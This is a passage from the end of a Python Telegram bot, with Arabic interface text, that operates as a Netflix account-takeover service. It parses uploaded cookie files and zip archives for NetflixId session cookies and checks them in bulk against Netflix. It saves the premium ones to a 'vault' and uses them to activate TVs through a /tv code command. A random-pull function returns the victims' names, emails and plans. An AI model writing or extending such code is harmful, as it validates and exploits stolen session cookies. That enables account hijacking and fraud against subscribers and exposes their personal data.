        await q.answer(f"🗑 حُذف {n}", show_alert=True)
        await q.edit_message_text(
            f"✅ <b>حُذف {n} ملف</b>\n\n🍪 الخزنة: <b>0</b>",
            parse_mode='HTML', reply_markup=admin_markup())
        return

    if data == "admin_promote":
        if uid != OWNER_ID:
            await q.answer("🚫 للمالك فقط", show_alert=True); return
        user_state[uid] = {'mode': 'waiting_admin', 'cookies': [], 'busy': False}
        await q.answer()
        await q.edit_message_text(
            "👥 <b>رفع أدمن</b>\n\n"
            "أرسل ID الرقمي للمستخدم.\n"
            "📌 مثال: <code>123456789</code>",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel", style="primary")]]))
        return

    # غير معروف
    await q.answer("❌", show_alert=False)


# ============================================================
# COMMANDS
# ============================================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    user_state[uid] = {'mode': 'idle', 'cookies': [], 'busy': False}
    await update.message.reply_html(START_MSG, reply_markup=get_main_markup(uid))


async def tv_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat = update.effective_chat.id
    args = context.args or []
    if not args:
        await update.message.reply_text("❌ الاستخدام: <code>/tv 12345678</code>", parse_mode='HTML')
        return
    code = re.sub(r'\D', '', args[0])
    if len(code) != 8:
        await update.message.reply_text("❌ الكود 8 أرقام!")
        return
    vault = count_vault_cookies()
    if vault == 0:
        await update.message.reply_text("😔 <b>الخزنة فارغة!</b>", parse_mode='HTML')
        return
    status = await update.message.reply_text(
        f"🔍 <b>جارٍ التفعيل...</b>\n📺 الكود: <code>{code}</code>\n🍪 الخزنة: <b>{vault}</b>",
        parse_mode='HTML')
    stop_anim = asyncio.Event()
    asyncio.create_task(animate_message(context, chat, status.message_id, stop_anim))
    result = await asyncio.to_thread(process_tv_login, code)
    stop_anim.set()
    await asyncio.sleep(0.3)
    with tv_stats_lock:
        tv_stats["total_logins"] += 1
        if result["success"]:
            tv_stats["successful"] += 1
            resp = (f"✅ <b>تم التفعيل!</b>\n\n"
                    f"📺 الكود: <code>{code}</code>\n"
                    f"🌍 الدولة: <b>{result.get('country', 'N/A')}</b>\n"
                    f"📦 الباقة: <b>{result.get('plan', 'N/A')}</b>\n\n"
                    f"🍪 المتبقي: <b>{count_vault_cookies()}</b>")
        elif result.get("error") == "no_cookies_left":
            tv_stats["failed"] += 1
            resp = "😔 <b>نفدت الكوكيز!</b>"
        else:
            tv_stats["codes_rejected"] += 1
            resp = f"❌ <b>فشل التفعيل</b>\n\n⚠️ {result.get('error', 'unknown')}"
    await status.edit_text(resp, parse_mode='HTML')


async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("🚫 Admin only!")
        return
    with tv_stats_lock:
        msg = (f"📊 <b>إحصائيات</b>\n\n"
               f"🍪 الخزنة: <b>{count_vault_cookies()}</b>\n"
               f"🎬 محاولات TV: <b>{tv_stats['total_logins']}</b>\n"
               f"✅ نجحت: <b>{tv_stats['successful']}</b>\n"
               f"❌ فشلت: <b>{tv_stats['failed']}</b>")
    await update.message.reply_text(msg, parse_mode='HTML')


# ============================================================
# 🎯 السحب العشوائي
# ============================================================
def _pull_random_cookie():
    attempts = 0
    max_attempts = 15
    while attempts < max_attempts:
        attempts += 1
        filename, content = get_random_cookie_file()
        if not filename:
            return {"ok": False, "error": "الخزنة فارغة"}
        ck = extract_cookie_dict_tv(content)
        if not ck or not ck.get('NetflixId'):
            continue
        res = check_netflix_cookie(ck)
        if not res.get("ok"):
            continue
        if not res.get("premium"):
            continue
        return {
            "ok": True,
            "name": res.get('name', 'Unknown'),
            "email": res.get('email', 'Unknown'),
            "country": res.get('country', 'Unknown'),
            "plan": res.get('plan', 'Unknown'),
            "membership_status": res.get('membership_status', 'Unknown'),
            "cookie": ck,
        }
    return {"ok": False, "error": "لم يتم العثور على كوكي بريميوم فعّال"}


# ============================================================
# FILE UPLOAD
# ============================================================
async def file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type != "private": return
    uid = update.effective_user.id
    if not is_admin(uid): return
    if user_state.get(uid, {}).get('mode') != 'check': return

    user_state.setdefault(uid, {})
    if user_state[uid].get('busy'):
        await update.message.reply_html("⚠️ قيد التنفيذ", reply_markup=STOP_MARKUP)
        return

    file = await update.message.document.get_file()
    ext = update.message.document.file_name.lower()

    with tempfile.TemporaryDirectory() as td:
        tp = os.path.join(td, update.message.document.file_name)
        await file.download_to_drive(tp)
        with open(tp, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()

        cookies = []
        if ext.endswith('.zip'):
            cookies = await extract_cookies_from_zip(tp)
        else:
            c = parse_cookie_file(content)
            for idx, (bn, cc) in enumerate(c):
                if cc.get('NetflixId'):
                    cookies.append((f"{safe_filename(update.message.document.file_name)}_{idx}", cc))

        seen = set(); dedup = []
        for nm, ck in cookies:
            h = hashlib.sha256(json.dumps(ck, sort_keys=True).encode()).hexdigest()
            if h not in seen:
                seen.add(h); dedup.append((nm, ck))

        if not dedup:
            await update.message.reply_text("❌ لا كوكيز في الملف.")
            return

        user_state[uid]['busy'] = True
        status = await update.message.reply_text(
            f"🔍 <b>جاري الفحص (بريم فقط)...</b>\n\n"
            f"📥 الملف: <code>{safe_filename(update.message.document.file_name)}</code>\n"
            f"🍪 عدد الكوكيز: <b>{len(dedup)}</b>",
            parse_mode='HTML')

        if uid not in user_executors:
            user_executors[uid] = ThreadPoolExecutor(max_workers=MAX_WORKERS)
        executor = user_executors[uid]

        premium_count = 0
        free_count = 0
        invalid_count = 0
        total = len(dedup)
        checked = 0

        for batch_start in range(0, total, BATCH_SIZE):
            batch = dedup[batch_start:batch_start + BATCH_SIZE]
            loop = asyncio.get_running_loop()
            futures = []
            for nm, ck in batch:
                futures.append(
                    asyncio.wait_for(
                        loop.run_in_executor(executor, check_netflix_cookie, ck),
                        timeout=35
                    )
                )
            results = await asyncio.gather(*futures, return_exceptions=True)

            for i, result in enumerate(results):
                checked += 1
                nm, ck = batch[i]

                if isinstance(result, Exception):
                    invalid_count += 1
                    continue

                if result.get("ok"):
                    if result.get("premium"):
                        if save_cookie_to_vault(nm, ck):
                            premium_count += 1
                    else:
                        free_count += 1
                else:
                    invalid_count += 1

            try:
                filled = min(20, checked * 20 // total) if total > 0 else 20
                bar = '█' * filled + '░' * (20 - filled)
                await status.edit_text(
                    f"🔍 <b>جاري الفحص (بريم فقط)...</b>\n\n"
                    f"<code>{bar}</code>  {checked}/{total}\n\n"
                    f"🌟 بريم: <b>{premium_count}</b>\n"
                    f"🆓 مجاني: <b>{free_count}</b>\n"
                    f"❌ فاسد: <b>{invalid_count}</b>",
                    parse_mode='HTML')
            except Exception:
                pass

        user_state[uid]['busy'] = False
        user_state[uid]['mode'] = 'idle'
        vault_total = count_vault_cookies()

        await status.edit_text(
            f"✅ <b>اكتمل الفحص</b>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📥 فُحص: <b>{total}</b>\n"
            f"🌟 <b>بريم (محفوظ):</b> {premium_count}\n"
            f"🆓 مجاني (مُتجاهل): {free_count}\n"
            f"❌ فاسد: {invalid_count}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🍪 <b>الخزنة الآن:</b> {vault_total}",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("👑 لوحة الأدمن", callback_data="admin_panel", style="primary")]
            ]))


# ============================================================
# TEXT HANDLER
# ============================================================
async def on_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    mode = user_state.get(uid, {}).get('mode')
    if mode != 'waiting_admin':
        return
    if uid != OWNER_ID:
        return
    try:
        new_id = int(update.message.text.strip())
    except Exception:
        await update.message.reply_text("❌ رقم غير صالح")
        return
    if new_id in ADMIN_IDS or new_id in dyn_admins:
        await update.message.reply_text("⚠️ موجود مسبقاً")
        return
    dyn_admins.append(new_id)
    user_state[uid]['mode'] = 'idle'
    await update.message.reply_text(
        f"✅ تم رفع الأدمن: <code>{new_id}</code>",
        parse_mode='HTML',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("👑 لوحة الأدمن", callback_data="admin_panel", style="primary")]
        ]))
    try:
        await context.bot.send_message(new_id, "🎉 مبروك! تم ترقيتك إلى أدمن.")
    except Exception:
        pass


# ============================================================
# MAIN
# ============================================================
def main():
    print("=" * 50)
    print("  Netflix Bot — Fixed Ordering")
    print("=" * 50)
    print(f"  Vault: {count_vault_cookies()}")
    print("=" * 50)

    app = ApplicationBuilder().token(TOKEN).build()

    # ⚠️ الأوامر
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("tv", tv_command))
    app.add_handler(CommandHandler("stats", stats_command))

    # ⚠️ ترتيب مهم جداً — المحدد أولاً، العام أخيراً
    app.add_handler(CallbackQueryHandler(stop_check, pattern="^stop_check$"))
    app.add_handler(CallbackQueryHandler(do_linklogin, pattern="^do_linklogin$"))
    # ⚠️ mode_button أخيراً — بدون pattern حتى يستقبل البقية
    app.add_handler(CallbackQueryHandler(mode_button))

    # الملفات
    app.add_handler(MessageHandler(filters.Document.ALL & filters.ChatType.PRIVATE, file_upload))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))

    print("🚀 Running...")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    main()
